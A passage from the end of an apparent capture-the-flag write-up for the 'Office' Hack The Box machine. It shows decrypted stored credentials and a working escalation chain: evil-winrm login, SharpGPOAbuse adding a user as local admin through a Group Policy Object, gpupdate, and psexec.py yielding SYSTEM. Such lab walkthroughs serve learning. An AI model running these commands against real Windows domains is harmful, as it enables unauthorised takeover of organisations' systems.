</span></span></span><span class=line><span class=cl><span class=go>  dwHmacKeyLen       : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  pbHmackKey         :
</span></span></span><span class=line><span class=cl><span class=go>  algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span></span><span class=line><span class=cl><span class=go>  dwAlgHashLen       : 000000a0 - 160
</span></span></span><span class=line><span class=cl><span class=go>  dwHmac2KeyLen      : 00000010 - 16
</span></span></span><span class=line><span class=cl><span class=go>  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span></span><span class=line><span class=cl><span class=go>  dwDataLen          : 000000c0 - 192
</span></span></span><span class=line><span class=cl><span class=go>  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span></span><span class=line><span class=cl><span class=go>  dwSignLen          : 00000014 - 20
</span></span></span><span class=line><span class=cl><span class=go>  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Decrypting Credential:
</span></span></span><span class=line><span class=cl><span class=go> * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77;Key:available
</span></span></span><span class=line><span class=cl><span class=go>**CREDENTIAL**
</span></span></span><span class=line><span class=cl><span class=go>  credFlags      : 00000030 - 48
</span></span></span><span class=line><span class=cl><span class=go>  credSize       : 000000be - 190
</span></span></span><span class=line><span class=cl><span class=go>  credUnk0       : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  Type           : 00000002 - 2 - domain_password
</span></span></span><span class=line><span class=cl><span class=go>  Flags          : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  LastWritten    : 5/9/2023 11:03:21 PM
</span></span></span><span class=line><span class=cl><span class=go>  unkFlagsOrSize : 00000018 - 24
</span></span></span><span class=line><span class=cl><span class=go>  Persist        : 00000003 - 3 - enterprise
</span></span></span><span class=line><span class=cl><span class=go>  AttributeCount : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  unk0           : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  unk1           : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  TargetName     : Domain:interactive=OFFICE\HHogan
</span></span></span><span class=line><span class=cl><span class=go>  UnkData        : (null)
</span></span></span><span class=line><span class=cl><span class=go>  Comment        : (null)
</span></span></span><span class=line><span class=cl><span class=go>  TargetAlias    : (null)
</span></span></span><span class=line><span class=cl><span class=go>  UserName       : OFFICE\HHogan
</span></span></span><span class=line><span class=cl><span class=go>  CredentialBlob : H4ppyFtW183#
</span></span></span><span class=line><span class=cl><span class=go>  Attributes     : 0
</span></span></span></code></pre></div><p>where we have credentials: <code>HHogan:H4ppyFtW183#</code></p><p>Checking permissions for user <code>hhogan</code> shows that is a member of <code>Remote Management Users</code>, so we can connect as this user via <code>Windows Remote Management</code> (<code>WinRM</code>) with <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ evil-winrm -i 10.10.11.3 -u &#39;hhogan&#39; -p &#39;H4ppyFtW183#&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>office\hhogan
</span></span></span></code></pre></div><p>I notice that this new user is a member of <code>GPO</code> group. Searching again at <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#gpo-delegation class=external-link target=_blank rel=noopener>HackTricks suggest many ways to abuse this permission</a>. In my case I will use <code>SharpGPOAbuse</code>, which can be downloaded from <a href=https://github.com/FSecureLABS/SharpGPOAbuse class=external-link target=_blank rel=noopener>its Github repository</a>, but I will download a pre-compiled binary from <a href=https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0 class=external-link target=_blank rel=noopener>this repository</a>. First, we need to check the <code>GPO</code> names available. We can do this running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object -ExpandProperty DisplayName
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Windows Firewall GPO
</span></span></span><span class=line><span class=cl><span class=go>Default Domain Policy
</span></span></span><span class=line><span class=cl><span class=go>Default Active Directory Settings GPO
</span></span></span><span class=line><span class=cl><span class=go>Default Domain Controllers Policy
</span></span></span><span class=line><span class=cl><span class=go>Windows Update GPO
</span></span></span><span class=line><span class=cl><span class=go>Windows Update Domain Policy
</span></span></span><span class=line><span class=cl><span class=go>Software Installation GPO
</span></span></span><span class=line><span class=cl><span class=go>Password Policy GPO
</span></span></span></code></pre></div><p>and now we can add the current user (<code>HHogan</code>) to the <code>Administrators</code> group:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Policy&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Domain = office.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Domain Controller = DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
</span></span></span><span class=line><span class=cl><span class=go>[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
</span></span></span><span class=line><span class=cl><span class=go>[+] GUID of &#34;Default Domain Policy&#34; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
</span></span></span><span class=line><span class=cl><span class=go>[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
</span></span></span><span class=line><span class=cl><span class=go>[+] The GPO does not specify any group memberships.
</span></span></span><span class=line><span class=cl><span class=go>[+] versionNumber attribute changed successfully
</span></span></span><span class=line><span class=cl><span class=go>[+] The version number in GPT.ini was increased successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
</span></span></span><span class=line><span class=cl><span class=go>[+] Done!
</span></span></span></code></pre></div><p>However, we need to &ldquo;trigger&rdquo; this change (or we could wait up to 90 minutes), so we can try to force the changes running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; gpupdate /force
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Updating policy...
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Computer Policy update has completed successfully.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User Policy update has completed successfully.
</span></span></span></code></pre></div><p>We check if our user has been added to <code>Administrators</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; net user hhogan
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User name                    HHogan
</span></span></span><span class=line><span class=cl><span class=go>Full Name
</span></span></span><span class=line><span class=cl><span class=go>Comment
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               Yes
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            5/6/2023 11:59:34 AM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             Never
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          5/7/2023 11:59:34 AM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   5/10/2023 5:30:58 AM
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships      *Administrators       *Remote Management Use
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Domain Users         *GPO Managers
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>and it&rsquo;s there.</p><div class="notice note"><div class=notice-title><i class="fa-solid fa-sticky-note" aria-hidden=true></i>Note</div><div class=notice-content>There is some task running constantly removing our user from <code>Administrators</code> group, so we should act quickly with the next step.</div></div><p>I quickly use <code>psexec.py</code> to access to the system as <code>NT Authority/System</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ rlwrap -cAr python3 /usr/share/doc/python3-impacket/examples/psexec.py &#39;HHogan&#39;:&#39;H4ppyFtW183#&#39;@10.10.11.3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Requesting shares on 10.10.11.3.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Found writable share ADMIN$
</span></span></span><span class=line><span class=cl><span class=go>[*] Uploading file pCcJgcit.exe
</span></span></span><span class=line><span class=cl><span class=go>[*] Opening SVCManager on 10.10.11.3.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Creating service LqNH on 10.10.11.3.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Starting service LqNH.....
</span></span></span><span class=line><span class=cl><span class=go>[!] Press help for extra shell commands
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.20348.2322]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nt authority\system
</span></span></span></code></pre></div><p>and we can get the <code>root.txt</code> flag at <code>Administrator</code> Desktop.</p><p>~Happy Hacking!</p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2023 -
2024
gunzf0x
·
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>